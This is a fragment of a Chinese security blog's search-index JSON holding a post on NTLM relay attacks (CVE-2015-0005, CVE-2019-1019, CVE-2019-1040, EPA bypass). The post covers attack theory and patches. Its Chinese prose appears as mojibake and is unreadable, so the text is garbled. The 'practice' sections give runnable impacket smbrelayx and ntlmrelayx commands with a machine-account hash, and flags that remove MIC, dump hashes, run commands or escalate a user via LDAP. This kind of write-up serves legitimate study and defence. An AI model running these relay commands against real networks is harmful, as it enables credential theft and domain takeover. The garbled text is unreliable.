è®¤è¯å’Œä¸€ä¸ªå®‰å…¨é€šé“è¿›è¡Œç»‘å®šï¼Œåœ¨ NTLM è®¤è¯è¿‡ç¨‹ä¸­ï¼Œæœ€åçš„ NTLM è®¤è¯æ•°æ®æŠ¥æ–‡åŒ…å«ä¸€ä¸ªç›®æ ‡åº”ç”¨æœåŠ¡å™¨çš„è¯ä¹¦æ‘˜è¦ï¼Œè¿™ä¸ªæ‘˜è¦ä½¿ç”¨å®¢æˆ·ç«¯çš„ NTLM å€¼è¿›è¡Œç­¾åä¿æŠ¤ï¼Œå¯ä»¥é˜²æ­¢ä¼ªé€ è¯ä¹¦çš„æ”»å‡»ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.6 å…³äº NTLM åè®®çš„ä¸€äº›æ€»ç»“ NT Hash = md4(unicode(hex(password))) NTLMv2 Hash = HMAC-MD5(unicode(hex(upper(username+domain))), NT Hash) NTProofStr = HMAC-MD5(challenge + æ•°æ®, NTLMv2 Hash) Session Key = HMAC_MD5(HMAC_MD5(NTLMv2 Response + Challenge, NTLMv2 Hash), NTLMv2 Hash) MIC = HMAC_MD5(NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE, Session key) ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:1:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 CVE-2015-0005 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 åŸç† åº”ç”¨æœåŠ¡å™¨åœ¨æ”¶åˆ°ç”¨æˆ·å®¢æˆ·ç«¯çš„è®¤è¯ä¿¡æ¯åï¼Œç”±äºæœ¬èº«æ²¡æœ‰å­˜å‚¨ç”¨æˆ·çš„å£ä»¤ä¿¡æ¯ï¼Œæ‰€ä»¥å¿…é¡»ä¾èµ–åŸŸæœåŠ¡å™¨è¿›è¡Œè®¤è¯ï¼Œå°†æ”¶åˆ°çš„è®¤è¯ä¿¡æ¯å‘é€ç»™åŸŸæœåŠ¡å™¨ï¼Œè¿™ä¸ªè¿‡ç¨‹åŸºäº NETLOGON åè®®ã€‚è¯¥åè®®åœ¨åº”ç”¨æœåŠ¡å™¨å’ŒåŸŸæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€ä¸ªå®‰å…¨ä¼šè¯ï¼Œå®‰å…¨ä¼šè¯å…±äº«å¯†é’¥åŸºäºåº”ç”¨æœåŠ¡å™¨ä¸»æœºè´¦å·çš„å£ä»¤ NTLM ç”Ÿæˆã€‚ 2.1.1 NETLOGON æ­¥éª¤ å‡ä¸º RPC è¿œç¨‹å‘è®¤è¯æœåŠ¡å™¨è°ƒç”¨ NetrLogonSamLoginEx NetrLogonSamLogonWithFlags NetrLogonSamLogon NetrLogonSamLogoff 2.1.2 æ”»å‡»åœºæ™¯ win10x64en$ ä¸Šçš„ç”¨æˆ· eviluser ï¼Œè®¿é—®å†…æœåŠ¡å™¨ win2008R2$ çš„ SMB æœåŠ¡ï¼Œé‡‡ç”¨ NTLM è®¤è¯æ–¹å¼ï¼ŒåŸŸæœåŠ¡å™¨ä¸º Win2016-dc01$ ï¼Œè®¤è¯è¿‡ç¨‹æ¦‚æ‹¬å¦‚ä¸‹: win10x64en$ é¦–å…ˆå‘ win2008R2$ çš„ SMB 445 ç«¯å£å‘èµ·ä¸€ä¸ªè¿æ¥ NTLM_NEGOTIATEï¼Œåå•†ä½¿ç”¨ NTLM è®¤è¯æ–¹å¼ï¼› win2008R2$ æ”¶åˆ°åï¼Œå‘é€ NTLM CHALLENGE è¿”å›ç»™ win10x64en$ï¼› win10x64en$ æ”¶åˆ° NTLM CHALLENGE åï¼Œå‘ win2008R2$ å‘é€ä¸€ä¸ª NTLM è®¤è¯æŠ¥æ–‡ï¼› Win2008R2$ å’ŒåŸŸæ§æœåŠ¡å™¨ä¹‹é—´å…±äº«äº† Win2008R2$ çš„å£ä»¤ NTLMï¼Œä»¥æ­¤ç”Ÿæˆä¼šè¯å¯†é’¥ï¼Œåˆ›å»ºä¸€ä¸ª NETLOGON å®‰å…¨ä¼šè¯ã€‚Win2008R2$ é€šè¿‡ RPC è°ƒç”¨åŸŸæœåŠ¡å™¨çš„ NetrLogonSamLogonWithFlags å‡½æ•°ï¼Œå¹¶å°† win10x64en$ å‘é€è¿‡æ¥çš„è®¤è¯ä¿¡æ¯åŠ ä¸Šæ­¤å‰çš„æŒ‘æˆ˜ä¿¡æ¯å…¨éƒ¨å¡«è£…è¿›å…¥ä½œä¸ºå‚æ•°ï¼› åŸŸæœåŠ¡å™¨æ”¶åˆ°ä¿¡æ¯åï¼ŒéªŒè¯è®¤è¯ä¿¡æ¯ï¼Œå¦‚æœè®¤è¯åˆæ³•åˆ™è¿”å› STATUS_SUCCESSï¼› å¦‚æœ NetrLogonSamLogonWithFlags è°ƒç”¨æˆåŠŸï¼Œåˆ™åº”ç”¨æœåŠ¡å™¨ä¼šè¿”å› NETLOGON_VALIDATION æ•°æ®ç»“æ„ï¼Œè¯¥ç»“æ„çš„ç»“å°¾å¯èƒ½æ˜¯ä»¥ä¸‹ç»“æ„ä¸­çš„ä¸€ç§: NETLOGON_VALIDATIN_SA_FO ï¼ŒNETLOGON_VALIDATION_SAM_INFO2ï¼ŒNETLOGON_VALIDATION_SAM_INFO4ã€‚åœ¨è¿™ä¸ªç»“æ„ä¸­æœ‰ä¸€ä¸ªé‡è¦çš„æ•°æ®ï¼Œå°±æ˜¯ SessionKey ï¼Œç”¨äºç”¨æˆ·å®¢æˆ·ç«¯å’Œåº”ç”¨æœåŠ¡å™¨ä¹‹é—´çš„ç­¾åã€åŠ å¯†ç­‰ï¼› SessionKey åŸºäºå®¢æˆ·ç«¯ç”¨æˆ·çš„å£ä»¤ NTLM ç”Ÿæˆï¼Œåº”ç”¨æœåŠ¡å™¨ä» DC è·å–ï¼Œå®¢æˆ·ç«¯ç”¨æˆ·è‡ªå·±é‡‡ç”¨ç›¸åŒçš„ç®—æ³•ç”Ÿæˆï¼Œå› æ­¤åº”ç”¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸éœ€è¦äº¤äº’ SessionKey; ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸»æœºå(å¾®è½¯çš„è§£é‡Š ã€ŒComputer Name: The Unicode string that contains the NetBIOS name of the client computer calling this methodã€)ï¼Œä¸»æœºåä¸ºè°ƒç”¨è¯¥å‡½æ•°çš„å®¢æˆ·ç«¯ä¸»æœºåï¼Œä¹Ÿå°±æ˜¯åº”ç”¨æœåŠ¡å™¨é€šè¿‡ RPC è¿œç¨‹è°ƒç”¨çš„è¯¥å‡½æ•°ï¼Œå› æ­¤è¯¥ä¸»æœºåç†è®ºä¸Šåº”è¯¥ä¸åº”ç”¨æœåŠ¡å™¨å’ŒåŸŸæœåŠ¡å™¨ä¹‹é—´å®‰å…¨ä¼šè¯å¯†é’¥çš„ä¸»æœºè´¦å·åº”è¯¥ä¸€è‡´ã€‚ æ‰€ä»¥ä»»ä½•ä¸€å°åŸŸå†…ä¸»æœºï¼Œåªè¦èƒ½æ‹¿åˆ°æ­¤å‰ç”¨æˆ·å’Œåº”ç”¨æœåŠ¡å™¨çš„è®¤è¯ä¿¡æ¯ï¼Œå°±å¯ä»¥å‘åŸŸæœåŠ¡å™¨å‘èµ· NETLOGONï¼Œä»è€Œè·å– SessionKeyï¼Œè¿™æ ·åé¢å¯ä»¥ä¼ªé€ åº”ç”¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ç”¨æˆ·ä¹‹é—´çš„æ•°æ®ç­¾åï¼Œæ»¡è¶³ä¸­é—´äººæ”»å‡»ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 å®æˆ˜ åˆ©ç”¨ impacket ä¸­çš„ smbrelayx è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œå¦‚æœç›®æ ‡æœºå™¨å¼ºåˆ¶ä½¿ç”¨ SMB ç­¾åï¼Œè¯¥æ¨¡å—ä¼šä½¿ç”¨ NETLOGON ç›´æ¥è·å–ç­¾åç”¨çš„ sessionKey ç¯å¢ƒï¼š æ”»å‡»æœºï¼ˆéåŸŸå†…ä¸»æœºï¼‰ï¼š192.168.68.24 å®¢æˆ·ç«¯æœåŠ¡å™¨ï¼ˆè¢«ä¸­é—´äººæ”»å‡»çš„æœåŠ¡å™¨ï¼‰ï¼š SERVER-2008 ç›®æ ‡ä¸»æœºã€åº”ç”¨æœåŠ¡å™¨ï¼š Windows Server 2012 - 172.16.147.130 ä¿¡æ¯ å¦‚æœæ˜¯éåŸŸä¸»æœºï¼Œéœ€è¦æŒ‡å®šå½“å‰åŸŸå†…ä»»æ„ä¸€å°ä¸»æœºçš„ hashï¼Œä¸”æŒ‡å®šåŸŸæ§çš„ IPã€‚ python2 smbrelayx.py -h 172.16.147.130 -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 å¯ä»¥ä½¿ç”¨ -e å‚æ•°æŒ‡å®šç›®æ ‡æœºå™¨è¦æ‰§è¡Œçš„æ–‡ä»¶ï¼Œä¸æŒ‡å®šçš„è¯ï¼Œé»˜è®¤ dump ä¸‹ç›®æ ‡æœºå™¨çš„ Hashï¼Œ-c å¯ä»¥æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 é˜²å¾¡ å½±å“ Windows Server 2012 åŠä»¥ä¸‹ï¼Œå¯¹ä¸ªäºº PC æ— å½±å“ å¾®è½¯å‘å¸ƒäº†è¡¥ä¸ MS15-027ï¼Œé’ˆå¯¹è¿™ä¸ªæ¼æ´è¿›è¡Œäº†ä¿®è¡¥ï¼Œå¯¹ ComputerName å’Œ NetBIOS è¿™ 2 ä¸ªå­—æ®µè¿›è¡Œäº†æ ¡éªŒï¼Œå¹¶ä¸”å¯¹è¿™ä¸ªæ¶ˆæ¯è®¤è¯å—è¿›è¡Œäº†ç­¾åæ ¡éªŒ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 CVE-2019-1019 åœ¨ CVE-2015-0005 æ¼æ´è¢«ä¿®è¡¥åï¼ŒåŸŸæœåŠ¡å™¨ä¼šæ ¡éªŒ ComputerName å’Œ NetBIOS è¿™ 2 ä¸ªå­—æ®µæ˜¯å¦ä¸€è‡´ã€‚ä½†æ˜¯å¦‚æœ ComputerName å­—æ®µç¼ºå¤±ï¼Œåˆ™åŸŸæœåŠ¡å™¨ä¼šæ¥å—ï¼Œè€Œä¸”ä¸ä¼šå¯¹è®¤è¯æ¶ˆæ¯è¿›è¡Œå®Œæ•´æ€§æ ¡éªŒ(MIC) ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.1 åŸç† ç”±äº NTLM_AUTHENTICATION æŠ¥æ–‡ä¸­çš„å¾ˆå¤šä¿¡æ¯ï¼ŒåŒ…æ‹¬ ComputerName å­—æ®µä¿¡æ¯ï¼Œæ˜¯ä» NTLM-CHALLENGE ä¸­æ‹·è´è·å–ï¼Œå› æ­¤åœ¨æ”»å‡»è€…å¯ä»¥æˆªè·ç”±åº”ç”¨æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯çš„æŒ‘æˆ˜ä¿¡æ¯ï¼Œå¹¶å°† ComputerName å­—æ®µè¿›è¡Œåˆ é™¤ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°æŒ‘æˆ˜ä¿¡æ¯åï¼Œç”±äºæ‰¾ä¸åˆ° ComputerName å­—æ®µï¼Œä¼šå¯¼è‡´éšåçš„ NTLM_AUTHENTICATION ä¹Ÿä¸åŒ…å«è¯¥å­—æ®µã€‚ é€šè¿‡é…ç½®ï¼Œå¯ä»¥è®© NTLM å¯ç”¨å®Œæ•´æ€§æ ¡éªŒï¼Œå³åœ¨è®¤è¯æ¶ˆæ¯ä¸­æ·»åŠ ä¸€ä¸ªå­—æ®µ MIC(Message Integrity Code)ï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­è¿™æ˜¯é»˜è®¤å¼€å¯çš„åŠŸèƒ½ã€‚MIC æ˜¯ç”¨æ¥ä¿æŠ¤ NTLM è®¤è¯æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼Œå³ NTLM_CHALLENGEã€‚ MIC é€šè¿‡åŸºäº SessionKey ä¼šè¯ç§˜é’¥çš„ HMAC_MD5 ç®—æ³•å®ç°å®Œæ•´æ€§ä¿æŠ¤ï¼Œè€Œæ­¤å‰çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬æœ‰èƒ½åŠ›æ–¹æ³•è·å–è¿™ä¸ª SessionKeyï¼Œå› æ­¤ä¿®æ”¹åé‡æ–°è®¡ç®— MIC å³å¯ã€‚ å®¢æˆ·ç«¯å‘èµ·åˆ°åº”ç”¨æœåŠ¡å™¨çš„ NTLM_NEGOTIATEï¼Œè¢«é‡æ”¾æ”»å‡»è€…æ•è· æ”»å‡»è€…å°† NTLM_NEGOTIATE è½¬å‘ç»™çœŸæ­£çš„åº”ç”¨æœåŠ¡å™¨ï¼Œä¹Ÿå³æˆ‘ä»¬çš„æ”»å‡»ç›®æ ‡ åº”ç”¨æœåŠ¡å™¨è¿”å›ä¸€ä¸ª NTLM_CHALLENGE ç»™æ”»å‡»è€… é‡æ”¾æ”»å‡»è€…å°† NTLM_CHALLENGE ä¸­çš„ ComputerName å­—æ®µå»æ‰ï¼Œç„¶åè½¬å‘ç»™å®¢æˆ·ç«¯ å®¢æˆ·ç«¯æ”¶åˆ°ä¿®æ”¹åçš„ NTLM_CHALLENGE ï¼ŒåŸºäºè¿™äº›ä¿¡æ¯æ„é€  NTLM_AUTHENTICATE ï¼Œå°†è®¤è¯ä¿¡æ¯å‘é€ç»™é‡æ”¾æ”»å‡»è€…ï¼Œæ­¤æ—¶è®¤è¯æ¶ˆæ¯å·²ç»åŒ…å« MIC é‡æ”¾æ”»å‡»è€…å‘åŸŸæœåŠ¡å™¨å‘èµ·ä¸€ä¸ª NETLOGON ä¼šè¯è¯·æ±‚ï¼Œç”±äºè®¤è¯æ¶ˆæ¯ä¸­ ComputerName å­—æ®µç¼ºå¤±ï¼ŒåŸŸæœåŠ¡å™¨ä¸è¿›è¡Œå®Œæ•´æ€§æ ¡éªŒï¼Œè®¤å¯è¯¥è®¤è¯æ¶ˆæ¯ï¼Œå¹¶è¿”å›ä¸€ä¸ª Sessionkey é‡æ”¾æ”»å‡»è€…é‡æ–°è®¡ç®— MIC ï¼Œå¹¶å°†æ–°çš„ NTLM_AUTHENTICATE å‘é€ç»™åº”ç”¨æœåŠ¡å™¨ åº”ç”¨æœåŠ¡å™¨æ”¶åˆ° NTLM_AUTHENTICATE åï¼Œæ ¡éªŒ MICï¼Œç„¶åå‘åŸŸæœåŠ¡å™¨å‘èµ· NETLOGON ä¼šè¯è¯·æ±‚ï¼ŒåŸŸæœåŠ¡å™¨è¿”å›è®¤è¯æˆåŠŸçš„å“åº”ï¼Œå…¶ä¸­åŒ…å«ä¼šè¯å¯†é’¥ï¼Œè¿™ä¸ªä¼šè¯å¯†é’¥å’Œç¬¬ 6 æ­¥ä¸­çš„ä¼šè¯å¯†é’¥ç›¸åŒ é‡æ”¾æ”»å‡»è€…æˆåŠŸåœ°ä¸åº”ç”¨æœåŠ¡å™¨å»ºç«‹äº†ä¸€ä¸ªå¸¦ç­¾åçš„ä¼šè¯ï¼Œè·å–äº†å®¢æˆ·ç«¯ç”¨æˆ·åœ¨åº”ç”¨æœåŠ¡å™¨ä¸Šçš„è®¿é—®æƒé™ï¼Œå¦‚æœå®¢æˆ·ç«¯ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ï¼Œè€Œåº”ç”¨æœåŠ¡å™¨æ˜¯åŸŸæœåŠ¡å™¨ï¼Œåˆ™é‡æ”¾æ”»å‡»è€…å…·å¤‡äº†åœ¨åŸŸæœåŠ¡å™¨(åº”ç”¨æœåŠ¡å™¨)ä¸Šçš„ç®¡ç†å‘˜æƒé™(å®¢æˆ·ç«¯)ã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.2 å®æˆ˜ åˆ©ç”¨ impacket ä¸­çš„ ntlmrelayx.py è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œä½¿ç”¨ -remove-target å‚æ•°ã€‚ python3 ntlmrelayx.py -h 172.16.147.130 -remove-target --enum-local-admins -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 CVE-2019-1040 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 åŸç† åœ¨å®‰è£…äº† CVE-2015-0005 çš„è¡¥ä¸åï¼Œç³»ç»Ÿä¼šæ ¡éªŒ NetBIOS çš„åç§°å’Œ NetrLogonSamLogonWithFlags å‡½æ•°çš„ ComputeName å‚æ•°æ˜¯å¦ç›¸åŒã€‚å› æ­¤ï¼Œæ­¤å‰é€šè¿‡ä¿®æ”¹ ComputerName æ¥è·å– SessionKey çš„æ–¹æ³•å¤±æ•ˆã€‚ ä½†æ˜¯å¦‚æœè®¤è¯ä¿¡æ¯ä¸­çš„ NetBIOS è¢«åˆ é™¤æˆ–è€…æ¶ˆå¤±åï¼Œè®¤è¯æœåŠ¡å™¨ä¸ä¼šå†è¿›è¡Œå‰é¢çš„åå­—æ ¡éªŒï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å†ä¿®æ”¹ ComputerName å‚æ•°ï¼Œèƒ½è¾¾æˆ CVE-2015-0005 æ¼æ´çš„æ•ˆæœï¼Œä»è€Œè·å–ä¼šè¯å¯†é’¥ã€‚ é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œå¯ä»¥é€šè¿‡é…ç½®â€œæœåŠ¡å™¨æ‹’ç»ä»»ä½•æ²¡æœ‰ NetBIOS çš„è¯·æ±‚â€æ¥é˜»æ­¢æ­¤ç±»æ”»å‡»ã€‚ä½†æ˜¯åœ¨ NTLMv1 ä¸­ï¼ŒNTLM æ¶ˆæ¯å—ç»“æ„ä½“ä¸­ï¼Œæœ¬æ¥å°±æ²¡æœ‰è¿™ä¸ªå­—æ®µï¼Œå› æ­¤è¿™ç§æ”»å‡»åœ¨ NTLMv1 åœºæ™¯ä¸­éš¾ä»¥é€šè¿‡ç­–ç•¥æˆ–è€…è¡¥ä¸æ¥æœç»ï¼Œä»ç„¶å­˜åœ¨å¾ˆå¤§çš„è„†å¼±æ€§ã€‚ å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åœ¨ NTLM åå•†æ—¶ï¼Œé€šè¿‡ä¸‹å›¾ä¸­ NegotiatFlags (å³ msvAvFlags å­—æ®µ)æ¥æ ‡è¯†æ˜¯å¦éœ€è¦ MIC æ¥ä¿æŠ¤ä¼šè¯çš„å®Œæ•´æ€§ï¼Œè§ä¸‹å›¾ä¸­çº¢è‰²æ¡†æ ‡è¯†ã€‚ SMB å®¢æˆ·ç«¯åœ¨ NTLM è®¤è¯æ—¶ï¼Œé»˜è®¤è®¾ç½®éœ€è¦ MIC è¿›è¡Œå®Œæ•´æ€§æ ¡éªŒä¿æŠ¤ã€‚ç›´è§‚è€Œè¨€ï¼Œä¸€èˆ¬ä¼šæœ‰å‡ ç§æ–¹å¼å¯¹æŠ— MICï¼Œä¸€æ˜¯ä¿®æ”¹ MICï¼Œå‰ææ¡ä»¶æ˜¯è·å–ä¼šè¯å¯†é’¥ï¼Œåœ¨å‰é¢æˆ‘ä»¬çœ‹åˆ°ï¼šå¦‚æœé…ç½®äº†é˜²æŠ¤ç­–ç•¥ï¼Œé€šè¿‡åˆ é™¤ NetBIOS ä¸èƒ½è·å–ä¼šè¯å¯†é’¥ï¼›äºŒæ˜¯ç›´æ¥ä¸¢å¼ƒ MICï¼Œè¿™æ—¶éœ€è¦å°† msVAvFlags å­—æ®µä¸­çš„æ ‡å¿—ä½åŒæ ·è¿›è¡Œä¿®æ”¹ï¼Œä»¥åŠç‰ˆæœ¬ä¿¡æ¯ï¼Œå› ä¸ºæœ‰äº›ç‰ˆæœ¬é»˜è®¤æ˜¯å¿…é¡»è¦æœ‰ MICã€‚ msvAvFlags å­—æ®µçš„å®šä¹‰ï¼ŒæŸ¥çœ‹å¾®è½¯çŸ¥è¯†åº“ï¼Œå¦‚æœä¸º 0x00000002 è¡¨ç¤ºå®¢æˆ·ç«¯é€šè¿‡ MIC æ¥ä¿æŠ¤æ•°æ®æŠ¥æ–‡çš„å®Œæ•´æ€§ msvAVFlags å­—æ®µç”±ç”¨æˆ·çš„ NTLM æ•£åˆ—å€¼è¿›è¡Œç­¾åä¿æŠ¤ï¼Œå› æ­¤ä¸èƒ½ä¿®æ”¹ msvAVFlag å­—æ®µã€‚å®é™…ä¸­éå¸¸ç¥å¥‡ï¼ŒåŸŸæœåŠ¡å™¨å¹¶ä¸çœŸæ­£åœ¨ä¹ MIC å’Œ Version ä¿¡æ¯æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™æ ¡éªŒï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¸æ ¡éªŒã€‚ ä¸Šè¿°çš„æ”»å‡»æ–¹å¼ï¼Œå¯ä»¥é€šè¿‡é…ç½®è¿›è¡Œé˜»æ­¢ï¼Œå³å¦‚æœ msvAVFlags å­—æ®µè¡¨æ˜æœ‰ MIC å®Œæ•´æ€§æ ¡éªŒï¼Œå°±å¿…é¡»è¦æœ‰ MIC çš„å­˜åœ¨ï¼Œè€Œä¸”è¿›è¡Œæ ¡éªŒã€‚ä½†æ˜¯åœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œä»ç„¶å­˜åœ¨ä¸€äº›éšæ‚£ï¼Œä¾‹å¦‚ MacOS ã€Linux ç³»ç»Ÿä¸­çš„ FireFox é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸æ·»åŠ  MICã€‚ ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 å®æˆ˜ åˆ©ç”¨ impacket ä¸­çš„ ntlmrelayx.py è¿›è¡Œä¸­é—´äººæ”»å‡»ï¼Œä½¿ç”¨ --remove-mic å‚æ•°ã€‚ python3 ntlmrelayx.py -h ldap://172.16.147.130 --remove-mic --escalate-user commonuser -smb2support -machine-account pentest-ad/SERVER-2008$ -machine-hashes bab7079288e58b875c46601f274001e6:bab7079288e58b875c46601f274001e6 -domain 172.16.147.130 ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5 EPA-Bypass ","date":"2020-05-09","objectID":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2020/05/ntlm-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"5.1 åŸç† EPA (Enhanced Protection for Authentication)ï¼Œå°†è®¤è¯æŠ¥æ–‡ç»‘å®šåˆ°ä¸€ä¸ªå®‰å…¨é€šé“ä¸­ï¼Œä¸»è¦ç”¨äºä¿æŠ¤ Windows é›†æˆè®¤è¯çš„æœåŠ¡ï¼Œä¾‹å¦‚OWAã€ADFSã€ LDAPSã€‚ å…·ä½“çš„åšæ³•æ˜¯ï¼Œåœ¨è®¤è¯æŠ¥æ–‡ä¸­æ·»åŠ ä¸€ä¸ªå­—æ®µ Channel Bindingsï¼Œæ ¹æ®å¾®è½¯çš„è¯´æ˜ï¼ŒChannel Bindings ä¸ºä¸€æ®µ MD5 Hash å€¼ï¼Œè¡¨ç¤ºç»“æ„ä½“ gss_channel_bindings_struct çš„ MD5Hash å€¼ã€‚ å¦‚æœå¯ç”¨äº† EPAï¼Œåœ¨å®¢æˆ·ç«¯å‘é€çš„è®¤è¯æŠ¥æ–‡ä¸­ï¼Œä¼šæ·»åŠ ä¸€ä¸ªå­—æ®µ NTProofStrï¼Œè¿™æ˜¯ä¸€æ®µç­¾åï¼Œç”¨æ¥ä¿æŠ¤ Channel Bindingsã€‚å¾®è½¯ç»™å‡º NTProofStr çš„è®¡ç®—ç®—æ³•å¦‚ä¸‹: å¯ä»¥å¾—çŸ¥ï¼Œ NTProofStr åŸºäºç”¨æˆ·çš„ NTLM å€¼è®¡ç®—å¾—æ¥ï¼Œå› æ­¤ï¼Œåœ¨æ­¤ç§æ”»å‡»åœºæ™¯ä¸­ä¸å¯èƒ½è®¡ç®—å¾—å‡ºã€‚å¯ä»¥ä½¿ç”¨ EPA æ¥ä¿æŠ¤ ADFSã€OWAã€ LDAPS ç­‰åŸºäº NTLM è®¤è¯çš„åœºæ™¯ã€‚æ¯”è¾ƒæ‚²å‰§çš„æ˜¯ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸Šè¿°è¿™äº›æœåŠ¡å™¨éƒ½æ²¡æœ‰å¼ºåˆ¶ä½¿ç”¨äº† EPAã€‚NTProofStr å’Œ Channel Bindings 